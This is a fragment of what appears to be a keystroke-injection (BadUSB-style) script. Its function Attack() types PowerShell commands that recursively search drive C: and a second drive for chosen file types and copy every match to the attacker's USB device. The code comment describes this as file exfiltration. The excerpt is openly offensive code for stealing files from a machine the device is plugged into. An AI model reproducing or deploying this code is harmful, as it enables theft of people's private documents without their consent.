...
function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
  ...
  type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name};"); 				           	// Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
  type("Get-ChildItem " + SearchDrive + "/ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name};"); 	// Searches and copies the files in the SearchDrive
